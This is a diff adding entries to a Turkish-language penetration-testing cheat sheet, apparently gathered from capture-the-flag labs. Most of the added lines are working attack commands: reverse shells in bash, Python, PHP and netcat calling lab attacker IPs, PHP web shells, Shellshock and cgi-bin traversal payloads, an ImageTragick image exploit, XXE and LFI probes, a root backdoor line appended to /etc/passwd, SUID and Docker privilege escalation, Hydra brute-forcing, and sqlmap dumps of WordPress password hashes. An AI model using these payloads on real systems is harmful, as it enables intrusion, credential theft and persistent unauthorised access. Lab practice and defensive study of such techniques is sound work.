@@ -59,6 +59,14 @@ echo -n "Base64 Hash'e çevirmek istediğiniz kod. Örnek = (echo -n "bash -i >&
 echo "<Yazmak istediğiniz şey >" > < İçine yazmak istediğiniz dosya/doküman>
 
 echo 1 > /proc/sys/net/ipv4/ip_forward ---> IP forward
+ 
+echo "cp /bin/bash /tmp && chmod +s /tmp/bash" > /etc/print.sh
+
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.69",4486));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'" > cow.sh
+
+echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.69 4485 >/tmp/f" > admin_checks
+
+echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64
 
 # WPSCAN Kulanımı #
 wpscan --url < URL > -e vp,u ---> '-e' = Enum || vp ---> Vulnerable plugins || u ---> Users
@@ -87,14 +95,224 @@ ifconfig eth0 hw ether 00:11:22:33:44:55 ---> İstediğin MAC adresini atar.
 ifconfig eth0 up ---> ETH0 bağlantısını kurar.
  
 # SQL Map #
-sqlmap -r request --dbs --batch
+sqlmap -r request --dbs --batch ---> Database ve kullanıcıları çıkarır.
 
-sqlmap -r request --dbs --batch -D wordpress --tables
+sqlmap -r request --dbs --batch -D wordpress --tables ---> Database'de ki tabloları gösterir.
 
-sqlmap -r request --dbs --batch -D wordpress -T wp_users --columns
+sqlmap -r request --dbs --batch -D wordpress -T wp_users --columns ---> Database'de ki kolonları gösterir.
 
-sqlmap -r request --dbs --batch -D wordpress -T wp_users -C user_email,user_pass --sql-query "Select user_email,user_pass from wp_users"
+sqlmap -r request --dbs --batch -D wordpress -T wp_users -C user_email,user_pass --sql-query "Select user_email,user_pass from wp_users" ---> Database'den istediğimiz bilgileri çekmek.
 
-sqlmap -r request --dump -D wordpress -T wp_users
+sqlmap -r request --dump -D wordpress -T wp_users ---> Wordpress kullanılmışsa Wordpress kullanıcılarını çekme.
+ 
+# WP Example #
+http://10.10.85.123/wordpress/wp-content/themes/twentytwenty/404.php ---> Wordpress dosyalarında 404.php'de değişiklik yaptığında gideceğin yer.
+ 
+# Microsoft Downloader #
+Invoke-WebRequest <resource_to_download> -outfile <output_file_name>
+ 
+# GoBuster #
+gobuster dir -u 10.10.111.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ---> Basit kullanım
+
+gobuster dir -u 10.10.150.189 -w /usr/share/wordlists/dirb/common.txt ---> Basit kullanım
+
+gobuster dir -u 10.10.150.189 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html ---> php,txt,html uzantılıları da arama
+
+gobuster dir -U joker -P hannah -u http://10.10.9.219:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/dirb/common.txt ---> user ve password girerek bak,old,tar,gz,tgz,zip,7z uzantıları arama.
+
+gobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
+ 
+# Sudo #
+sudo -l ls -la
+
+sudo -u toby /bin/bash
+
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+ 
+# Import OS #
+
+import os
+os.system("/bin/bash")
+
+# Hydra #
+hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.9.219 ssh -vV
+
+hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.32.242 http-get ----> Basic Auto - Get Metod.
+
+hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.225.50 -vV
+
+hydra hogwartz-castle.thm http-form-post "/login/index.php:user=^USER^&password=^PASS^:Incorrect Username or Password" -l Hagrid -P /usr/share/wordlists/rockyou.txt
+
+hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:user=^USER^&pass=^PASS^:Username or password invalid” -f
+
+hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.117.44:55007 -Vv 
+
+# Basic HashID #
+hashid -m $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
+
+# Tunnel #
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f
+
+-c 'bash -i >& /dev/tcp/10.9.1.69/4486 0>&1'
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.0.229/4485 0>&1'");
+
+php -r '$sock=fsockopen("10.9.0.229",4485);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<?php system($_GET['cmd']); ?>
+
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f'); ?>
+
+# ARP Scanner #
+arp-scan -I eth0 192.168.240.128/24
+
+arp -a
+
+## SSH ##
+
+ssh -i id_rsa jessie@10.10.176.189
+
+# Testing Web App #
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
+
+10.10.4.54/shell.php?cmd=nc%2010.9.1.69%204485%20-e%20/bin/bash
+
+http://10.10.216.6:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/bash%2010.11.9.81%2080%209999
+
+# Find #
+find / -name elyana 2>/dev/null - - - - SHELL=/bin/bash script -q /dev/nulls - Meterpreter
+
+find / -user hermonine -type f 2>/dev/null
+
+find / -type f -user root -perm -u=s 2>/dev/null
+
+find / -user root -perm -4000 -executable -type f 2>/dev/null
+
+find / -type f -name "proof.txt" -exec ls -l {} + 2>/dev/null
+
+find / -type f -group lxd -exec ls -l {} + 2>/dev/null
+
+find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) -exec ls -la {} \; 2>/dev/null
+
+# LTrace #
+ltrace /usr/sbin/checker
+
+# Docker #
+docker images
+
+docker run -v /:/mnt --rm -it bash chroot /mnt bash
+
+# Head #
+head asd.txt -c 9
+
+# Curl #
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.1.69/4485 0>&1' http://10.10.183.66/cgi-bin/test.cgi
+
+curl 'http://10.10.90.19/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.0.229/4485 0>&1' -H "Content-Type: text/plain"
+
+curl -s http://www.team.thm/scripts/script.old
+
+curl -s 10.10.83.164 -D header.txt
+
+# GPG - GPGToJohn #
+gpg --import priv.key
+
+gpg --decrypt-file CustomerDetails.xlsx.gpg
+
+gpg2john private.asc > pgp.hash
+
+# Cat Writing #
+
+cat > /home/toby/jobs/cow.sh << EOF
+#!/bin/bash
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.69",4485));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+EOF
+
+cat > bak.py << EOF
+#!/usr/bin/env python
+import pty
+pty.spawn("/bin/bash")
+EOF
+
+cat > image.png << EOF
+
+cat > image.png << EOF
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+EOF
+ 
+# FUZZ FUF # 
+wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0
+
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
+
+wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.244.142:5000/api/v1/resources/books?FUZZ=/etc/passwd"
+
+ffuf -w wordlist.txt -u https://target .com/FUZZ -mc 200
+
+# GetCap #
+getcap -r / 2>/dev/null
+
+# EnumForLinux #
+enum4linux -a 10.10.16.141
+
+# XXD #
+xxd thm.jpg | head
+
+# Printf - OpenSSL #
+printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
+
+openssl passwd -1 -salt "inferno" "dante"
+
+printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
+
+# Rabin #
+rabin2 -z need_to_talk
+
+# NetStat #
+netstat -putan
+
+# ECHO Writing #
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f" > /home/server-management/Documents/rev.sh
+
+# SOCAT #
+./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
+
+# XLM Test #
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+
+# CD D:/ #
+cd /d d:
+
+# Shell #
+ECHO $SHELL
+chsh -s /bin/bash root
+
+# Google #
+OR ---> veya için kullanılır.
+
+inurl: ---> urlde geçen sonuçlar için.
+
+intitle: ---> Etikette geçen ifadeleri görmek için.Örn: intitle:"webcamxp 5"
+
+intext: ---> Textlerde geçen ifadeler için.
+
+filetype: ---> Verilecek olan ifadenin dosya biçimine göre arama yapar. Örn: filetype:pdf hacking ---> Hacking kelimesini içeren pdf dosyaları.
+
+allintext: ---> Tüm textin içerisinde arama yapmak için. Örn: allintext:"@gmail.com"
+
+# NetDiscover #
+netdiscover -r 182.154.164.1/24
+
+
  
 
